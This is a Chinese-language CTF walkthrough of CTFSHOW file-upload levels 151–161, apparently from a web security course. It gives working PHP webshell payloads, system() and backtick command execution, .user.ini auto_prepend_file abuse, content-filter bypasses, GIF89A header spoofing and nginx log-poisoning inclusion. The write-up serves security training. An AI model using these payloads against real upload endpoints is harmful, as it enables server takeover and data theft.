# 31-WEB攻防-通用漏洞&amp;文件上传&amp;js验证&amp;mime&amp;user.ini&amp;语言特性

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135890043-ca33350f-b997-44b1-8349-4c5491a49020.png)

```plain
#知识点：
1、文件上传-前端验证
2、文件上传-黑白名单
3、文件上传-user.ini妙用
4、文件上传-PHP语言特性

#详细点：
1、检测层面：前端，后端等
2、检测内容：文件头，完整性，二次渲染等
3、检测后缀：黑名单，白名单，MIME检测等
4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等

#本章课程内容：
1、文件上传-CTF赛题知识点
2、文件上传-中间件解析&编辑器安全
3、文件上传-实例CMS文件上传安全分析

#前置：
后门代码需要用特定格式后缀解析，不能以图片后缀解析脚本后门代码(解析漏洞除外)
如：jpg图片里面有php后门代码，不能被触发，所以连接不上后门
```

- CTFSHOW-文件上传-151到161关卡

------

```plain
151
查看源代码，看看是否有前台验证。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135884637-d5c10dc7-fd93-49f8-ace7-ec4c59d7a67b.png)

看到外部引用的JavaScript代码，进行进一步跟踪

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135884660-80a890eb-c59e-4411-adc3-42fba09ee2cf.png)

```plain
发现过滤性代码：<button type="button" class="layui-btn" id="upload" lay-data="{url: 'upload.php', accept: 'images',exts:'png'}">
鼠标放在上传图片中，然后右键元素，对<button type="button" class="layui-btn" id="upload" lay-data="{url: 'upload.php', accept: 'images',exts:'png'}">进行修改，把png改为php，就可以进行文件上传php文件
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135884781-6d008f8c-2bd6-436b-a380-08b0ef115575.png)

上传php代码后，进行flag的读取。查找flag位置：x=system('ls ../');

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135884820-2d27dc53-468c-4090-8c0b-1ed3a6521183.png)

读取flag：x=system('tac ../flag.php');

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135885163-867c4419-95e5-47ca-a251-346511a7920f.png)

```plain
152
查看源代码，把png修改为php，发生文件类型不合规。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135885158-75d21fcc-eb60-4ebb-bd72-5ed8b834188c.png)

接着把Content-Type: application/octet-stream修改Content-Type: image/png类型，能够上传了php

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135885164-645448b9-33bb-4813-bae9-07c6a3d25a76.png)

```plain
接着就是获取flag位置，读取flag
获取flag：x=system('ls ../');
读取flag：x=system('tac ../flag.php');
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135885296-42643a10-7e78-474b-8250-56208063fb48.png)

```plain
153
继续修改png和Content-Type的值，但是饶过不了了。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135885483-b7ebdfde-7832-442c-86ce-423cb3206432.png)

```plain
思考：修改mime不生效，还有什么绕过方法：00截断，多文件格式后缀解析，大小写（但是提示下载），php5（提示下载），等。
这里我们使用的是.user.ini（与.htaccess类似，但是.htaccess搭建在Apache中才能使用。.user.ini是与PHP挂钩的。）
.user.ini解释：https://www.php.net/manual/zh/configuration.file.per-user.php
上传一个.user.ini，内容：auto_prepend_file=test.png
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135885545-8c728009-9a85-47e1-9932-a0753ba0b5bf.png)

接着上传png，写上后门代码：<?php eval($_POST['x']);?>

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135885541-12a86d31-fd7e-4f42-809b-86ec48a3e117.png)

```plain
然后访问：upload目录，查看flag位置：x=system('ls ../');
读取flag：x=system('tac ../flag.php');
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135885788-f05738ca-62f0-4940-b828-341858709dc7.png)

.user.ini的利用条件看似看简单，上传一个.user.ini，包含一个文件，上传文件就可以利用。但是这个需要一个指向性文件index.php，调用.user.ini，使.user.ini生效。访问并不是访问.user.ini和test.png，而是访问一个index.php文件（首先指向文件）。参考https://blog.csdn.net/z13615480737/article/details/89084360

```plain
154，155
上传.user.ini：auto_prepend_file=test.png
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135886104-133bb2a7-d798-4b41-8e4e-ffebb6d08e7c.png)

```plain
上传test.png：<?php eval($_POST['X']);?>
发现上传失败，对内容进行检测。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135885946-e3568990-fb3e-4e15-998e-93f9b82c5e79.png)

```plain
经过删除测试，对<?php进行了过滤。
那么如何绕过这个内容过滤呢，后门代码应该怎么执行呢。
能不能不写<?php也能执行出php代码效果？
下面这几种都是可以的：
<? echo '123';?>               //前提是开启配置参数short_open_tags=on
<?=(表达式)?>                  //不需要开启参数设置
<% echo '123';%>               //前提是开启配置参数asp_tags=on
<script language=”php”>echo '1'; </script>   //不需要修改参数开关
选择第二种写法<?=eval($_POST['x']);?>
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135886026-45035b56-f9dc-4b3f-8ee8-ec462cbe532c.png)

```plain
然后访问：upload/index.php文件，查看flag位置：x=system('ls ../');
读取flag：x=system('tac ../flag.php');
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135887130-0ca17bd7-d9e6-45ce-9401-93cf3d9dd9f9.png)

```plain
156
上传.user.ini和test.png
test.png：<?=eval($_POST['x']);?>存在过滤
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135886925-efc7ed5f-32d8-4bf3-b8a6-b90ab0886035.png)

```plain
删除测试，发现过滤了[]两个符号
php支持{}符号代替[]符号
<?=eval($_POST{'X'});>
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135887046-ca3c938d-0738-42a0-a4b4-70235cad4d96.png)

```plain
然后访问：upload/index.php文件，查看flag位置：x=system('ls ../');
读取flag：x=system('tac ../flag.php');
157 158
上传.user.ini：auto_prepend_file=test.png
上传test.png：<?=eval($_POST{'X'});>
test.png对内容进行了检测
对分号进行过滤，那么想不要分号能不能执行语句。那么可以直接调用来执行。

可以直接上传读取文件的代码：<?=system('tac ../fl*')?>
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135887043-02ed4127-3937-4782-a335-6a809a1b6689.png)

直接访问/upload/index.php

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135887297-3c75105c-fc8f-4a2a-964c-31161e21c4f7.png)

```plain
159
上传.user.ini：auto_prepend_file=test.png
上传test.png：<?=system('tac ../fl*')?>
发现<?=system('tac ../fl*')?>进行了过滤()
直接用反引号来进行命令执行`
这样构造payloa：<?`tac ../f*?>
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135889355-664bf780-d0e4-4ede-8f7b-8b1ed0dc80d1.png)

这样读取是不可以的，需要加上flag的相对路径，<? echo `tac /var/www/html/f*`?> 访问upload就可以获取flag

```plain
160
上传.user.ini：auto_prepend_file=test.png
上传test.png：<? echo `tac /var/www/html/f*`?>
发现对test.png 的内容进行了过滤`

这次关卡用到的是包含日志性文件，日志里面会记录访问者的信息：ua头，访问地址，访问ip 等。
运行linux nginx的日志路径：/var/log/nginx/access.log
包含日志文件：test.png
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135890795-13bf5dd1-7e84-4caf-9c95-c66e257dc437.png)

发现日志文件会记录ua头信息，在UA头中写入后门代码<?php eval($_POST['x']);?>

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135889720-609866a7-8f15-4596-9193-779cd5e63897.png)

```plain
161
上传.user.ini,直接被拦截
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135887734-2162c880-76a2-4e70-a63e-b67dc4eb9d9b.png)

换正常的图片看看能不能上传，发现是文件头过滤，在代码上加上GIF89A

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135888332-b271479d-07a2-4e3c-a7f6-1ebaad130041.png)

```plain
上传png：GIF89A <?=include"/var/lo"."g/nginx/access.lo"."g"?>
访问upload，修改UA头，写上后门代码。就可以读取flag
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135890871-991289e6-659b-4a68-ab4f-566785bd3c8a.png)